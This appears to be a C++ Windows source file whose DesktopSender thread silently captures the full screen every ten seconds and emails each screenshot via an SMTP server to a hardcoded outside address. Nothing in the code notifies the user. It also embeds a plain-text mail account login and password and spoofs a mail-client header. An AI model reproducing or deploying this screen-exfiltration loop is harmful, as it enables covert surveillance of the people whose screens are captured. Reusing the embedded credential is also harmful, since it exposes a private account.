#include "StdAfx.h"
#include "DesktopSender.h"
#include "csmtp/CSmtp.h"

extern "C" {
#include "jpeglib.h"
#include "jmorecfg.h"
#include "jconfig.h"
}

#define BITSPERPIXEL		24
#define JPEG_QUALITY        50

LPVOID       pBits=NULL;

DesktopSender::DesktopSender(void)
{
    m_bRun = FALSE;
    m_bIsSend = TRUE;
    m_bDeleteAfterSend = TRUE;
    m_nFrameRate = 1;
    m_hEvent = CreateEvent(NULL, TRUE, FALSE, _T("DesktopSenderEvent"));
}

DesktopSender::~DesktopSender(void)
{
}

BOOL DesktopSender::Init(BOOL bIsSend, BOOL bDeleteAfterSend, int nFrameRate)
{
    m_bIsSend = bIsSend;
    m_bDeleteAfterSend = bDeleteAfterSend;
    m_nFrameRate = nFrameRate;

    return TRUE;
}

/*===================================================================================
function:       jpeg压缩
input:          1:生成的文件名,2:bmp的指针,3:位图宽度,4:位图高度,5:颜色深度
return:         int
description:    bmp的像素格式为(RGB)
===================================================================================*/
int savejpeg(char *filename, unsigned char *bits, int width, int height, int depth)
{
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    FILE * outfile;                 /* target file */
    JSAMPROW row_pointer[1];        /* pointer to JSAMPLE row[s] */
    int     row_stride;             /* physical row width in image buffer */

    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);

    if ((outfile = fopen(filename, "wb")) == NULL) {
        fprintf(stderr, "can't open %s/n", filename);
        return -1;
    }
    jpeg_stdio_dest(&cinfo, outfile);

    cinfo.image_width = width;      /* image width and height, in pixels */
    cinfo.image_height = height;
    cinfo.input_components = 3;         /* # of color components per pixel */
    cinfo.in_color_space = JCS_RGB;         /* colorspace of input image */

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, JPEG_QUALITY, TRUE /* limit to baseline-JPEG values */);

    jpeg_start_compress(&cinfo, TRUE);

    row_stride = width * depth; /* JSAMPLEs per row in image_buffer */

    while (cinfo.next_scanline < cinfo.image_height) {
        //这里我做过修改，由于jpg文件的图像是倒的，所以改了一下读的顺序
        //这是原代码：row_pointer[0] = & bits[cinfo.next_scanline * row_stride];
        row_pointer[0] = & bits[(cinfo.image_height - cinfo.next_scanline - 1) * row_stride];
        (void) jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cinfo);
    fclose(outfile);

    jpeg_destroy_compress(&cinfo);
    return 0;
}

void SaveBitmap(TCHAR *szFilename,HBITMAP hBitmap)
{
    HDC					hdc=NULL;
    FILE*				fp=NULL;
    LPVOID				pBuf=NULL;
    BITMAPINFO			bmpInfo;
    BITMAPFILEHEADER	bmpFileHeader;
    DWORD dwBufSize = 0;

    do{
        hdc=GetDC(NULL);
        ZeroMemory(&bmpInfo,sizeof(BITMAPINFO));
        bmpInfo.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
        GetDIBits(hdc,hBitmap,0,0,NULL,&bmpInfo,DIB_RGB_COLORS);

        if(bmpInfo.bmiHeader.biSizeImage<=0)
            bmpInfo.bmiHeader.biSizeImage=(bmpInfo.bmiHeader.biWidth*bmpInfo.bmiHeader.biBitCount+31)/32*4*abs(bmpInfo.bmiHeader.biHeight);
        
        if((pBuf=malloc(bmpInfo.bmiHeader.biSizeImage))==NULL)
        {
            MessageBox(NULL,_T("Unable to Allocate Bitmap Memory"),_T("Error"),MB_OK|MB_ICONERROR);
            break;
        }

        bmpInfo.bmiHeader.biCompression=BI_RGB;
        GetDIBits(hdc,hBitmap,0,bmpInfo.bmiHeader.biHeight,pBuf,&bmpInfo,DIB_RGB_COLORS);
        if(bmpInfo.bmiHeader.biCompression==BI_RGB){
            dwBufSize = bmpInfo.bmiHeader.biSizeImage;
            bmpInfo.bmiHeader.biSizeImage = 0;
        }

        BYTE *image_buffer = (BYTE*)pBuf;
        /*for (int i=0, j=0; j < bmpInfo.bmiHeader.biWidth, bmpInfo.bmiHeader.biHeight*4; i+=3, j+=4)
        {
            *(image_buffer+i)=*(image_buffer+j+2);
            *(image_buffer+i+1)=*(image_buffer+j+1);
            *(image_buffer+i+2)=*(image_buffer+j);
        }*/
        //savejpeg("ok.jpg", image_buffer, bmpInfo.bmiHeader.biWidth, bmpInfo.bmiHeader.biHeight, 3);

        if((fp=_tfopen(szFilename,_T("wb")))==NULL)
        {
            MessageBox(NULL,_T("Unable to Create Bitmap File"),_T("Error"),MB_OK|MB_ICONERROR);
            break;
        }

        bmpFileHeader.bfReserved1=0;
        bmpFileHeader.bfReserved2=0;
        bmpFileHeader.bfSize=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER)+dwBufSize;
        bmpFileHeader.bfType='MB';
        bmpFileHeader.bfOffBits=sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);

        fwrite(&bmpFileHeader,sizeof(BITMAPFILEHEADER),1,fp);
        fwrite(&bmpInfo.bmiHeader,sizeof(BITMAPINFOHEADER),1,fp);
        fwrite(pBuf,dwBufSize,1,fp);

    }while(false);

    if(hdc)
        ReleaseDC(NULL,hdc);

    if(pBuf)
        free(pBuf);

    if(fp)
        fclose(fp);
}

int savepng(TCHAR *szFilename)
{
    HDC hdcSrc = GetDC(NULL);
    int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);
    int nWidth = GetDeviceCaps(hdcSrc, HORZRES);
    int nHeight = GetDeviceCaps(hdcSrc, VERTRES);
    CImage image;
    image.Create(nWidth, nHeight, nBitPerPixel);
    BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdcSrc);
    image.ReleaseDC();
    image.Save(szFilename, Gdiplus::ImageFormatPNG);//ImageFormatJPEG
    return 0;
}

char *w2c(char *pcstr,const wchar_t *pwstr, int len)  
{  
    int nlength=wcslen(pwstr);  
    //获取转换后的长度  
    int nbytes = WideCharToMultiByte( 0, 0, pwstr, nlength, NULL,0,NULL, NULL );
    if(nbytes > len)
        return NULL;
    else
        // 通过以上得到的结果，转换unicode 字符为ascii 字符  
        WideCharToMultiByte(0, 0, pwstr, nlength, pcstr, nbytes, NULL, NULL);  
    return pcstr ;  
}

DWORD WINAPI DesktopSenderProc(LPVOID pParam)
{
    DesktopSender* pDesktopSender = (DesktopSender *)pParam;
#if 1
    TCHAR fileName[MAX_PATH];
    while(pDesktopSender->m_bRun){
        _stprintf(fileName, _T("desktopCap%d.png"), pDesktopSender->m_dwImageNum++);
        savepng(fileName);

        CSmtp mail;
        if(mail.GetLastError() != CSMTP_NO_ERROR)
        {
            printf("Unable to initialise winsock2.\n");
            return -1;
        }

        mail.SetSMTPServer("smtp.163.com",25);
        mail.SetLogin("15210882403@163.com");
        mail.SetPassword("yanda19841216");
        mail.SetSenderName("ZWW");
        mail.SetSenderMail("15210882403@163.com");
        mail.SetReplyTo("15210882403@163.com");
        mail.SetSubject("The message");
        mail.AddRecipient("284454806@qq.com");
        mail.SetXPriority(XPRIORITY_NORMAL);
        mail.SetXMailer("The Bat! (v3.02) Professional");
        mail.SetMessageBody("This is my message from CSmtp.");
#ifdef UNICODE
        char tmpFileName[MAX_PATH]={0};
        mail.AddAttachment(w2c(tmpFileName,fileName,sizeof(tmpFileName)));
#else
        mail.AddAttachment(fileName);
#endif

        if( mail.Send() )
            printf("The mail was send successfully.\n");
        else
        {
            printf("%s\n",GetErrorText(mail.GetLastError()));
            printf("Unable to send the mail.\n");
        }
        WaitForSingleObject(pDesktopSender->m_hEvent, 10000);
    }
#else
    static HBITMAP	hDesktopCompatibleBitmap=NULL;
    static HDC		hDesktopCompatibleDC=NULL;
    static HDC		hDesktopDC=NULL;
    static HWND		hDesktopWnd=NULL;

    hDesktopWnd=GetDesktopWindow();
    hDesktopDC=GetDC(hDesktopWnd);
    hDesktopCompatibleDC=CreateCompatibleDC(hDesktopDC);

    int BitPerPixel = ::GetDeviceCaps(hDesktopDC, BITSPIXEL);

    BITMAPINFO	bmpInfo;
    ZeroMemory(&bmpInfo,sizeof(BITMAPINFO));
    bmpInfo.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
    bmpInfo.bmiHeader.biBitCount=BitPerPixel;//BITSPERPIXEL;
    bmpInfo.bmiHeader.biCompression = BI_RGB;
    bmpInfo.bmiHeader.biWidth=GetSystemMetrics(SM_CXSCREEN);
    bmpInfo.bmiHeader.biHeight=GetSystemMetrics(SM_CYSCREEN);
    bmpInfo.bmiHeader.biPlanes=1;
    //bmpInfo.bmiHeader.biSizeImage=abs(bmpInfo.bmiHeader.biHeight)*bmpInfo.bmiHeader.biWidth*bmpInfo.bmiHeader.biBitCount/8;
    bmpInfo.bmiHeader.biSizeImage=(bmpInfo.bmiHeader.biWidth*bmpInfo.bmiHeader.biBitCount+31)/32*4*abs(bmpInfo.bmiHeader.biHeight);
    
    hDesktopCompatibleBitmap=CreateDIBSection(hDesktopDC,&bmpInfo,DIB_RGB_COLORS,&pBits,NULL,0);
    if(hDesktopCompatibleDC==NULL || hDesktopCompatibleBitmap == NULL)
    {
        TRACE(_T("Unable to Create Desktop Compatible DC/Bitmap"));
        return 0;
    }
    SelectObject(hDesktopCompatibleDC,hDesktopCompatibleBitmap);

    while(pDesktopSender->m_bRun){
        TCHAR	szFileName[512]; 

        _tcscpy(szFileName,_T("ScreenShot.bmp"));

        SetCursor(LoadCursor(NULL,IDC_WAIT));	
        int		nWidth=GetSystemMetrics(SM_CXSCREEN);
        int		nHeight=GetSystemMetrics(SM_CYSCREEN);
        HDC		hBmpFileDC=CreateCompatibleDC(hDesktopDC);
        HBITMAP	hBmpFileBitmap=CreateCompatibleBitmap(hDesktopDC,nWidth,nHeight);
        HBITMAP hOldBitmap = (HBITMAP) SelectObject(hBmpFileDC,hBmpFileBitmap);
        BitBlt(hBmpFileDC,0,0,nWidth,nHeight,hDesktopDC,0,0,SRCCOPY|CAPTUREBLT);
        SelectObject(hBmpFileDC,hOldBitmap);

        SaveBitmap(szFileName,hBmpFileBitmap);

        DeleteDC(hBmpFileDC);
        DeleteObject(hBmpFileBitmap);
        break;
    }

    if(hDesktopCompatibleDC)
        DeleteDC(hDesktopCompatibleDC);
    if(hDesktopCompatibleBitmap)
        DeleteObject(hDesktopCompatibleBitmap);
    ReleaseDC(hDesktopWnd,hDesktopDC);
#endif
    return 1;
}

BOOL DesktopSender::Start()
{
    if(m_bRun)
        return FALSE;
    m_bRun = TRUE;
    m_dwImageNum=0;
    HANDLE handle = CreateThread(NULL, 0, DesktopSenderProc, this, 0, NULL);
    if(handle)
    {
        CloseHandle(handle);
    }else{
        m_bRun = FALSE;
    }
    return m_bRun;
}

BOOL DesktopSender::Stop()
{
    m_bRun = FALSE;
    SetEvent(m_hEvent);

    return TRUE;
}

